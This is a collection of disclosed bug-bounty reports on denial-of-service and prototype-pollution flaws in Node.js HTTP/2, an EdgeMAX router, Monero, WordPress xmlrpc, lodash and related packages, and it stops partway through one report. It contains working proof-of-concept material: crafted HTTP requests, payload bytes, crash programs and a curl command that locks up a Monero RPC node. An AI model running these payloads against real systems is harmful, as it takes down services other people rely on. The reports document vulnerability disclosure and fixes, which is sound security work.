A security researcher has conducted a broad survey of HTTP/2 implementations to investigate common Denial of Service attack vectors. The Node.js implementation has been found to be subject to a number of these issues. (On the plus side, we're not the only ones! ;-) ...)

This work is still under embargo and has not yet been disclosed. 

Specifically:

* Data Dribble Attack: "This program will request 1MB of data from a specified resource. It will request this same resource over 100 streams (so, 100MB total). It manipulates window sizes and stream priority to force the server to queue the data in 1-byte chunks."

* Ping Flood (nginx variant):  "Nginx and libnghttp2 (used by Apache, Tomcat, node.js, and others) has a 10K-message limit on the number of control messages it will queue. Sending a controlled number of messages may enable an attacker to force the server to hold 10K messages in memory..."

* Resource Loop: "(actually, it should be called “Priority Shuffling”): This program continually shuffles the priority of streams in a way which causes substantial churn to the priority tree. Node.js [is] particularly impacted."

* Reset Flood: "This opens a number of streams and sends an invalid request over each stream. In some servers, this solicits a string of stream RSTs. In [Node.js] the servers may queue the RSTs internally until they run out of memory."

* O-Length Headers Leak: "This sends a stream of headers with a 0-length header name and 0-length header value. [Node.js] allocates memory for these headers and keeps the allocation alive until the session dies. Because the names and values are 0 bytes long, the cumulative length never exceeds the header size limit."

* Internal Data Buffering: "This opens the HTTP/2 window so the server can send without constraint; however, it leaves the TCP window closed so the server cannot actually write (many of) the bytes on the wire. Then, the client sends a stream of requests for a large response object which the target queues internally. This appears to work to create a long-ish standing queue in node.js"

Each is a distinct issue that will need to be looked at individually. I've edited the descriptions to remove references to vulnerabilities in other HTTP/2 implementations that have not yet been disclosed.

---

Additional details from the report:

```
“Data Dribble” on node.js: node.js seems to queue the data internally. For a 1MB output file
requested 100 times in parallel fast enough that node.js is constantly processing input,
node.js’s RSS rises by 808MB and then falls by 120MB (for an aggregate rise of 688MB).
(Actually, it looks like the numbers vary a bit across tests, but I think the end result is “a lot”.)
However, node.js does not have the excess CPU utilization which Nginx exhibits. If you
instead delay the sends considerably so that node.js has time to try to send in the meantime, it
looks like node.js will kill off the session before the input queue grows more than a few
hundred MB.

“Internal Data Buffering” on node.js: For a 1MB output file requested 100 times in parallel
(but sent with 24 requests per SSL frame), node.js behaves in an interesting way. It appears to
buffer some, but not all, data internally. It seems to continue reading (and processing requests
and queueing data to satisfy those requests) for as many streams as it can until it can’t read
any more. Once it can’t read anymore, it appears to try to write and realize the writing is
blocked. At that point, it seems to switch to reading frames from the wire and queuing the
requests internally (without processing them). (All of this is conjecture and is based on what
I’ve observed rather than a detailed analysis of the code.) So, if you pack the 100 requests
into a single SSL frame, node.js’s RSS increases by approximately 246MB. Or, if you send
585 requests in a single SSL frame, node.js’s RSS increases by approximately 1,296MB. For
reasons that are not entirely clear to me, if you send 100K requests each on three different
connections (approximately 2.8MB of request data per connection, node.js will run out of
memory and crash. The other interesting thing that happens is on the session ending. When
the session ends, it looks like node.js temporarily starts reading everything which is left in the
input queue, tries to process the requests, and store the request output in memory. So,
sending 100,000 requests (approximately 2.8MB of request data) and then closing the
connection can make node.js temporarily use 12GB of RSS.

Resource Loop on node.js: Over the loopback interface, node.js can handle roughly ~10 Mb/s
before the assigned thread uses 100% of its CPU core (on an m5.24xlarge). RSS rose from
50MB at the start of the test to 236MB by the end of test (~3 minutes). RSS rose another
156MB when a second stream was added. With two streams, serving of content to another
(non-attacking) connection was severely impacted.

Zero-length Headers on node.js: With truly 0-length headers (i.e. the payload is 0 bytes), the
server will accept and process an unlimited number; however, they don’t seem to create a
standing queue on the server side. The processing overhead is much lighter than the
“Resource Loop” test. (Roughly 25 Mb/s only produces a 75% CPU load on the server.) With
0-length headers which are Huffman encoded into 1-byte or greater headers, the server input
for that socket (and only that socket) seems to get blocked for ~ 2 minutes, until the
connection is killed off. It appears that the server will hold the connection open even if the
client goes away. That behavior allows a different kind of DoS attack (exhaust server file
descriptors or kernel receive buffers).

Reset Flood on node.js: The server queue grows without an obvious bound until the
connection dies or the server runs out of memory and dies. After the connection ends, the
server is unresponsive while GC runs
```

## Impact

Multiple denial of service vectors.

**Summary (team):**

A security researcher conducted a broad survey of HTTP/2 implementations to investigate common Denial of Service attack vectors. The Node.js implementation was been found to be subject to a number of these issues.

Specifically:

Data Dribble Attack: "This program will request 1MB of data from a specified resource. It will request this same resource over 100 streams (so, 100MB total). It manipulates window sizes and stream priority to force the server to queue the data in 1-byte chunks."

Ping Flood (nginx variant): "Nginx and libnghttp2 (used by Apache, Tomcat, node.js, and others) has a 10K-message limit on the number of control messages it will queue. Sending a controlled number of messages may enable an attacker to force the server to hold 10K messages in memory..."

Resource Loop: "(actually, it should be called “Priority Shuffling”): This program continually shuffles the priority of streams in a way which causes substantial churn to the priority tree. Node.js [is] particularly impacted."

Reset Flood: "This opens a number of streams and sends an invalid request over each stream. In some servers, this solicits a string of stream RSTs. In [Node.js] the servers may queue the RSTs internally until they run out of memory."

O-Length Headers Leak: "This sends a stream of headers with a 0-length header name and 0-length header value. [Node.js] allocates memory for these headers and keeps the allocation alive until the session dies. Because the names and values are 0 bytes long, the cumulative length never exceeds the header size limit."

Internal Data Buffering: "This opens the HTTP/2 window so the server can send without constraint; however, it leaves the TCP window closed so the server cannot actually write (many of) the bytes on the wire. Then, the client sends a stream of requests for a large response object which the target queues internally. This appears to work to create a long-ish standing queue in node.js"

Each is a distinct issue that will need to be looked at individually. I've edited the descriptions to remove references to vulnerabilities in other HTTP/2 implementations that have not yet been disclosed.

Additional details from the report:

“Data Dribble” on node.js: node.js seems to queue the data internally. For a 1MB output file
requested 100 times in parallel fast enough that node.js is constantly processing input,
node.js’s RSS rises by 808MB and then falls by 120MB (for an aggregate rise of 688MB).
(Actually, it looks like the numbers vary a bit across tests, but I think the end result is “a lot”.)
However, node.js does not have the excess CPU utilization which Nginx exhibits. If you
instead delay the sends considerably so that node.js has time to try to send in the meantime, it
looks like node.js will kill off the session before the input queue grows more than a few
hundred MB.

“Internal Data Buffering” on node.js: For a 1MB output file requested 100 times in parallel
(but sent with 24 requests per SSL frame), node.js behaves in an interesting way. It appears to
buffer some, but not all, data internally. It seems to continue reading (and processing requests
and queueing data to satisfy those requests) for as many streams as it can until it can’t read
any more. Once it can’t read anymore, it appears to try to write and realize the writing is
blocked. At that point, it seems to switch to reading frames from the wire and queuing the
requests internally (without processing them). (All of this is conjecture and is based on what
I’ve observed rather than a detailed analysis of the code.) So, if you pack the 100 requests
into a single SSL frame, node.js’s RSS increases by approximately 246MB. Or, if you send
585 requests in a single SSL frame, node.js’s RSS increases by approximately 1,296MB. For
reasons that are not entirely clear to me, if you send 100K requests each on three different
connections (approximately 2.8MB of request data per connection, node.js will run out of
memory and crash. The other interesting thing that happens is on the session ending. When
the session ends, it looks like node.js temporarily starts reading everything which is left in the
input queue, tries to process the requests, and store the request output in memory. So,
sending 100,000 requests (approximately 2.8MB of request data) and then closing the
connection can make node.js temporarily use 12GB of RSS.

Resource Loop on node.js: Over the loopback interface, node.js can handle roughly ~10 Mb/s
before the assigned thread uses 100% of its CPU core (on an m5.24xlarge). RSS rose from
50MB at the start of the test to 236MB by the end of test (~3 minutes). RSS rose another
156MB when a second stream was added. With two streams, serving of content to another
(non-attacking) connection was severely impacted.

Zero-length Headers on node.js: With truly 0-length headers (i.e. the payload is 0 bytes), the
server will accept and process an unlimited number; however, they don’t seem to create a
standing queue on the server side. The processing overhead is much lighter than the
“Resource Loop” test. (Roughly 25 Mb/s only produces a 75% CPU load on the server.) With
0-length headers which are Huffman encoded into 1-byte or greater headers, the server input
for that socket (and only that socket) seems to get blocked for ~ 2 minutes, until the
connection is killed off. It appears that the server will hold the connection open even if the
client goes away. That behavior allows a different kind of DoS attack (exhaust server file
descriptors or kernel receive buffers).

Reset Flood on node.js: The server queue grows without an obvious bound until the
connection dies or the server runs out of memory and dies. After the connection ends, the
server is unresponsive while GC runs

Impact:

Multiple denial of service vectors.

---

### [Resource Consumption DOS on Edgemax v1.10.6](https://hackerone.com/reports/406614)

- **Report ID:** `406614`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Ubiquiti Inc.
- **Reporter:** @grampae
- **Bounty:** - usd
- **Disclosed:** 2019-08-04T15:12:07.986Z
- **CVE(s):** -

**Vulnerability Information:**

Resource consumption Denial of service.

1: The request below shows that when you feed the beaker.session.id cookie variable a payload of 250 characters or more, the web management portal will produce an error page showing full path disclosure and more as shown in screenshots error1.png and error2.png.  

GET / HTTP/1.1
Host: 192.168.1.100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: beaker.session.id=v8iG24fDKn8x5uD3V2uICZA1FJEoUJpqH5VTa03xB5blDRNOe5AfFp2GNIBpDX8th1IO8sS5ejsz4Swm175nUvipwU211S4n4RtCv0A6r18fsgJbrrbmhFT9k2cAXF3yyg0Uu0B0wPOWP7BOrMVnXp44aHoXSfJ06ZXk7HrD5J5R9AZIgQLmGutM9ESNxw3CVJtW4Rfxeh7JE2AD04B3g78FxRgBxY82I2Gzf6ZPMsc39d37LM90dd9cFA
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
-----------------------------------------------------------

2: When providing a valid length payload of 249 characters or less it will be stored as a *.cache filename in the /var/run/beaker/container_file/ directory,this can easily be turned in to a denial of service by filling up the space of the device with unique beaker.session.id requests.  The web portal will display either a 500 error as shown in DOS1.png or a python error screen as shown in DOS2.1.png and DOS2.2.png.  Typically the web portal will stop functioning after the /run mount has reached 50% by sending requests using iterations of 1-15681 as a beaker.session.id variable, however any length of payload can be used up to 249 characters.  This can be recovered from by deleting all files within the /var/run/beaker/container_file/ directory.


Although once the /run mount can not accept any more files /var/log will start to fill up with complaints about not being able to write to /var/run/beaker/container_file/, then after /var/log fills up the device will stop responding all together until it has been power cycled.  

3: I have created a video showing you how it is accomplished, I stopped the video at only 7% resources consumed on the /run mount as the video would be pretty long if we waited until the edgerouter went offline.  I am hoping this is enough for you to be able to reproduce this.  I am thinking that this could be fairly bad if made in to a python script along with google dorks and automation.  Or even a python script that someone has to only enter in an IP address and it will take the router offline in about 5 minutes or so until the router owner unplugs and plugs it back in.

## Impact

Any resources served by the edgemax device will be unavailable until the physical device has it's power cycled, then it should function as normal.  However it would be easy to just perform the attack again after it has been brought back online.

---

### [CryptoNote: remote node DoS](https://hackerone.com/reports/506595)

- **Report ID:** `506595`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @anonimal
- **Bounty:** - usd
- **Disclosed:** 2019-07-03T00:20:02.687Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:

Remote node DoS. See patch below.

## Releases Affected:

All Monero versions, including the recent v0.14.0.2. Possibly all CryptoNote implementations that aren't Zano.

## Steps To Reproduce:

Since this is *currently* a theoretical attack, non-code PoC detailed in the patch below.

## Supporting Material/References:

Based against current `master` `49afbd0c53d29656689f319c7d3543204ead4e59`:

```diff
commit 6620d099800d8935596f59834ce389868b2851f0 (HEAD -> cryptonote)
gpg: Signature made Fri 08 Mar 2019 02:57:58 AM UTC
gpg:                using RSA key 12186272CD48E2539E2DD29B66A76ECF914409F1
gpg: using pgp trust model
gpg: Good signature from "anonimal <anonimal@getmonero.org>" [ultimate]
gpg:                 aka "anonimal <anonimal@kovri.io>" [ultimate]
gpg:                 aka "anonimal <anonimal@sekreta.org>" [ultimate]
gpg: binary signature, digest algorithm SHA256, key algorithm rsa4096
Author: anonimal <anonimal@getmonero.org>
Date:   Fri Mar 8 02:21:38 2019 +0000

    cryptonote_protocol_handler: prevent potential DoS
    
    Essentially, one can send such a large amount of IDs that core exhausts
    all free memory. This issue can theoretically be exploited using very
    large CN blockchains, such as Monero.
    
    Credit given to CryptoNote author 'cryptozoidberg' for the fix.

diff --git a/src/cryptonote_protocol/cryptonote_protocol_handler.h b/src/cryptonote_protocol/cryptonote_protocol_handler.h
index efd986b53..c9e35d2d9 100644
--- a/src/cryptonote_protocol/cryptonote_protocol_handler.h
+++ b/src/cryptonote_protocol/cryptonote_protocol_handler.h
@@ -52,6 +52,7 @@ PUSH_WARNINGS
 DISABLE_VS_WARNINGS(4355)
 
 #define LOCALHOST_INT 2130706433
+#define CURRENCY_PROTOCOL_MAX_BLOCKS_REQUEST_COUNT 500
 
 namespace cryptonote
 {
diff --git a/src/cryptonote_protocol/cryptonote_protocol_handler.inl b/src/cryptonote_protocol/cryptonote_protocol_handler.inl
index c8b43fb91..023d1b457 100644
--- a/src/cryptonote_protocol/cryptonote_protocol_handler.inl
+++ b/src/cryptonote_protocol/cryptonote_protocol_handler.inl
@@ -889,6 +889,16 @@ namespace cryptonote
   int t_cryptonote_protocol_handler<t_core>::handle_request_get_objects(int command, NOTIFY_REQUEST_GET_OBJECTS::request& arg, cryptonote_connection_context& context)
   {
     MLOG_P2P_MESSAGE("Received NOTIFY_REQUEST_GET_OBJECTS (" << arg.blocks.size() << " blocks, " << arg.txs.size() << " txes)");
+
+    if (arg.blocks.size() > CURRENCY_PROTOCOL_MAX_BLOCKS_REQUEST_COUNT)
+      {
+        LOG_ERROR_CCONTEXT(
+            "Requested objects count is too big ("
+            << arg.blocks.size() << ") expected not more then "
+            << CURRENCY_PROTOCOL_MAX_BLOCKS_REQUEST_COUNT);
+        drop_connection(context, false, false);
+      }
+
     NOTIFY_RESPONSE_GET_OBJECTS::request rsp;
     if(!m_core.handle_get_objects(arg, rsp, context))
     {
```

This is essentially from https://github.com/hyle-team/zano/blob/master/src/currency_protocol/currency_protocol_handler.inl#L364 and confirmation will be needed that Monero doesn't already mitigate this elsewhere.

I have the above patch in my branch ready for PR but if you want to create your own patch, please give credit to cryptozoidberg and myself (anonimal). Thank you.

## Impact

Remote node DoS.

---

### [(remote) exabyte allocation via load_from_binary() (DoS)](https://hackerone.com/reports/506498)

- **Report ID:** `506498`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @guido
- **Bounty:** - usd
- **Disclosed:** 2019-07-03T00:12:02.972Z
- **CVE(s):** -

**Vulnerability Information:**

Changes introduced in commit b82efa32e can result in a denial of service if ```epee::serialization::portable_storage::load_from_binary()``` is called with untrusted data.

The 'reserve' method implemented here:
https://github.com/monero-project/monero/commit/b82efa32e771f653c5e49165b0659c67e2db3438#diff-8de201c60a8c7a3a0a4c2e15f2c0939bR75

will attempt to allocate about 4 exabytes of memory when you run the following code:

```cpp
#include <serialization/keyvalue_serialization.h>
#include <storages/portable_storage_template_helper.h>
#include <storages/portable_storage_base.h>
#include <p2p/p2p_protocol_defs.h>
#include <p2p/net_node.h>

int main(void)
{
    unsigned char payload[] = {
        0x01, 0x11, 0x01, 0x01, 0x01, 0x01, 0x02, 0x01, 0x01, 0x08, 0x00, 0x84,
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
    };

    const std::string s(payload, payload + 20);
    epee::serialization::portable_storage ps;
    ps.load_from_binary(s);
}
```

Although I haven't yet constructed a proof of concept against a live Monero instance, this can probably achieved by a remote attacker because the ```load_from_binary``` call occurs several times in the network code in ```contrib/epee/include/storages/levin_abstract_invoke2.h```.

Please let me know if this is sufficient, or that you require proof of concept code that can be used against peers on the network.

## Impact

Crash monerod

---

### [Computing hash of crafted block leads to crash in tree_hash()](https://hackerone.com/reports/519120)

- **Report ID:** `519120`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @guido
- **Bounty:** - usd
- **Disclosed:** 2019-07-03T00:11:28.656Z
- **CVE(s):** -

**Vulnerability Information:**

I'm not sure how to test this against against an actual Monero instance, so I'm instead showing an isolated PoC:

```c
#include <cryptonote_basic/cryptonote_format_utils.h>

int main(void)
{
    cryptonote::block b = AUTO_VAL_INIT(b);
    for (size_t i = 0; i < 300000; i++) {
        b.tx_hashes.push_back({});
    }
    std::ostringstream oss;
    binary_archive<true> ba(oss);
    std::string s;
    if ( ::serialization::serialize(ba, b) == true ) {
        s = oss.str();
    } else {
        return 0;
    }

/* Uncomment to crash */
    cryptonote::block b2 = AUTO_VAL_INIT(b2);
    if ( parse_and_validate_block_from_blob(s, b2) == true ) {
        /* Crash */
        get_tx_tree_hash(b2);
    }
    return 0;
}
```

The reason this crashes is because of this code in ```tree_hash```:

```c
    char ints[cnt][HASH_SIZE];
    memset(ints, 0 , sizeof(ints));  // zero out as extra protection for using uninitialized mem
```

```ints``` is allocated on the stack, not on the heap. Its size is dynamic; ```cnt``` (derived from the number of ```tx_hashes``` in this example) multiplied by 32 (```HASH_SIZE```) is the amount of bytes reserved on the stack.

On a typical, modern 64 bit OS, the stack is usually 8MB in size. Hence, a sufficient amount of ```tx_hashes``` will cause more stack to be reserved than is available.
Technically, the reservation of the stack space doesn't cause the crash (this only alters the stack pointer), but the subsequent ```memset``` does.

Note that the serialized size of a block with 300000 tx_hashes is about 9 MB (see ```s.size()```), which is well within the limits of ```CRYPTONOTE_MAX_BLOCK_SIZE``` (500MB).

The best remediation to this issue is to use allocate memory on the heap, not the stack.

## Impact

Crash nodes

---

### [`useragent` is vulnerable to ReDoS in user-agent string](https://hackerone.com/reports/320159)

- **Report ID:** `320159`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @chalker
- **Bounty:** - usd
- **Disclosed:** 2019-04-03T20:24:34.377Z
- **CVE(s):** -

**Summary (team):**

Denial of Service by passing crafted user-agent strings.

---

### [xmlrpc.php file is enable it will used for (DOS) and bruteforce attack](https://hackerone.com/reports/448524)

- **Report ID:** `448524`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** FormAssembly
- **Reporter:** @meepmerp
- **Bounty:** - usd
- **Disclosed:** 2018-12-27T03:55:49.725Z
- **CVE(s):** -

**Vulnerability Information:**

Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS. The website https://www.formassembly.com/ has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts.

In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.

POST /wp/xmlrpc.php HTTP/1.1
Host: www.formassembly.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 91

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
***==================================================***
HTTP/1.1 200 OK
Date: Wed, 21 Nov 2018 16:43:06 GMT
Content-Type: text/xml; charset=UTF-8
Connection: close
Server: nginx
Vary: Accept-Encoding
X-XSS-Protection: 1; mode=block
Content-Length: 4272

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>



Notice that a successful response is received showing that the xmlrpc.php file is enabled.
Now, considering the domain https://www.formassembly.com the xmlrpc.php file discussed above could potentially be abused to cause a DDOS attack against a victim host. This is achieved by simply sending a request that looks like below.

POST /wp/xmlrpc.php HTTP/1.1
Host: www.formassembly.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 91

<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value><string>http://<***YOUR SERVER*** ></string></value>
</param>
<param>
<value><string>https://www.formassembly.com/</string></value>
</param>
</params>
</methodCall>


***remediation:***

If the XMLRPC.php file is not being used, it should be disabled and removed completely to avoid any potential risks. Otherwise, it should at the very least be blocked from external access.

***Thank you***

note: screenshots are given below

## Impact

This method is also used for brute force attacks to stealing the admin credentials and other important credentials

This can be automated from multiple hosts and be used to cause a mass DDOS attack on the victim.

---

### [Prototype Pollution Vulnerability in cached-path-relative Package](https://hackerone.com/reports/390847)

- **Report ID:** `390847`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @cris_semmle
- **Bounty:** - usd
- **Disclosed:** 2018-11-02T10:51:09.802Z
- **CVE(s):** CVE-2018-16472

**Vulnerability Information:**

I would like to report a prototype pollution attack in cached-path-relative.
It allows an attacker to inject properties on Object.prototype which are then inherited by all the JS objects through the prototype chain.

# Module

**module name:** cached-path-relative
**version:** 1.0.1
**npm page:** `https://www.npmjs.com/package/cached-path-relative`

## Module Description

Memoize the results of the path.relative function. path.relative can be an expensive operation if it happens a lot, and its results shouldn't change for the same arguments.

## Module Stats

352,446 downloads in the last week

# Vulnerability

## Vulnerability Description

If the attacker can control both the path and the cached value, she can deploy a prototype pollution attack and thus overwrite arbitrary properties on Object.prototype.

## Steps To Reproduce:

```js
var relative = require('cached-path-relative');
relative('__proto__', 'x');
console.log({}.x);
```

## Patch

Initialize the cache using Object.create(null) or use the Map data structure.

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

I am not sure how clients of this module use the API, but if attacker can control both the values passed to cached-path-relative, the attacker can write arbitrary properties on Object.prototype.

---

### [Prototype pollution attack (lodash / constructor.prototype)](https://hackerone.com/reports/380873)

- **Report ID:** `380873`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @asgerf
- **Bounty:** - usd
- **Disclosed:** 2018-10-30T12:59:31.457Z
- **CVE(s):** CVE-2018-16487

**Vulnerability Information:**

I would like to report a prototype pollution vulnerability in lodash.
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** lodash
**version:** 4.17.10
**npm page:** `https://www.npmjs.com/package/lodash`

## Module Description

The Lodash library exported as Node.js modules.

## Module Stats

12M downloads in the last week

# Vulnerability

## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The functions `merge`, `mergeWith`, and `defaultsDeep` can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{constructor: {prototype: {...}}}` and send it to `_.merge`.

```javascript
var _ = require('lodash');
var payload = JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}');
_.merge({}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

---

### [Malicious get_random_rct_outs.bin rpc can cause a near-infinite loop](https://hackerone.com/reports/391611)

- **Report ID:** `391611`
- **Severity:** High
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Monero
- **Reporter:** @ahook
- **Bounty:** - usd
- **Disclosed:** 2018-09-28T23:52:55.871Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**
An unsanitized get_random_rct_outs.bin rpc request can cause the rpc handler to go into an effectively infinite-loop, peg the cpu, and block other requests from completing.

**Description:**
The rpc endpoint /get_random_rct_outs.bin takes a uint64 outs_count as input and will return that many random outputs:
https://github.com/monero-project/monero/blob/9315e12d34a58970b311133f98f2b3e651f0ceb3/src/rpc/core_rpc_server.cpp#L479

There is no sanitization of the req.outs_count input in this function. (Other similar functions make sure the client does not request too many outputs at once).

The function then calls into Blockchain::get_random_rct_outs to get the outputs, again with no checking of the range of req.outs_count:
https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L1848

A naive hacker could send something like MAX_UINT64 and this function will send back all valid outputs. As of testing, this was around 6mm outs and resulted in a response of around 500MB. This in itself is a nuisance, as it ties up the thread, pegs the cpu to 100%, and has to allocate a GB or so of memory. But the rpc will eventually complete in such a case.

A better attacker could take advantage of the triangular distribution applied to the random number generator:
https://github.com/monero-project/monero/blob/master/src/cryptonote_core/blockchain.cpp#L1900

This math makes it very unlikely to land on very low txn indexes. For example, based on some empirical evidence, in order to get the 0th index, the random number (mod 2^53) would need to be in the range [0-205]. If my math is right, the probability of landing on the 0th index would be roughly (2^8/2^53 + 2^8/2^11), which is extremely unlikely.

This function loops until it finds outs_count random txns. If an attacker sends an outs_count equal to (or very close to) the total valid outputs, it will attempt to loop until it randomly chooses all/most unique values between [0-num_outs), which will most likely never complete since the triangular distribution makes it extremely unlikely to land on the low indexes.

## Releases Affected:
This rpc was added years ago and hasn't changed much, so any current release is affected.

## Steps To Reproduce:
This can be triggered with a simple curl command. In the below example, a hex representation of a valid serialized request is sent to the target's endpoint as a binary post. Replace <target_host>:<target_port> with the target (e.g. localhost:18081). The last 8 bytes (16 hex chars) is the little-endian outs_count value.

When I was testing, a value of 6,772,629 (0x59557670000000000) was sufficiently close to num_outs to cause the daemon to go into an effectively infinite loop. This number changes as more txns are added to the chain, so the attacker would just need to operate their own node, or query a fully synced node in some way, in order to know the current num_outs to request.

```
$ # NOTE: piping the result to wc so it just displays the size of the output (if it ever returns)
$ echo "011101010101020101040a6f7574735f636f756e74059557670000000000" | xxd -r -p | curl -i -X POST --data-binary @- http://<target_host>:<target_port>/get_random_rctouts.bin | wc
```

## Impact

If monerod's rpc port is publicly open, an attacker can lock up the node by sending a malicious curl. CPU will spike to 100%. It also holds on to Blockchain::m_blockchain_lock, so any other requests that need that lock will stall (in some cases even the p2p port can become unresponsive as well but I'm not 100% sure in which scenarios that occurs).

I wasn't sure what to set the severity to for this bug. For a node with an open rpc port, I'd consider this critical. But not all nodes have the port open. A quick scan of 168 live nodes yielded 41 which had this port open and would be susceptible. So I think about 25% of the network would be affected as of right now.

---

### [Prototype pollution attack (extend)](https://hackerone.com/reports/381185)

- **Report ID:** `381185`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** Node.js third-party modules
- **Reporter:** @asgerf
- **Bounty:** - usd
- **Disclosed:** 2018-08-22T07:48:35.622Z
- **CVE(s):** CVE-2018-16492

**Vulnerability Information:**

I would like to report prototype pollution in extend
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** extend
**version:** 3.0.1
**npm page:** `https://www.npmjs.com/package/extend`

## Module Description

`node-extend` is a port of the classic extend() method from jQuery. It behaves as you expect. It is simple, tried and true.

> **Note**: The github project is called `node-extend` but the NPM package is just `extend`

## Module Stats

7M downloads in the last week

# Vulnerability
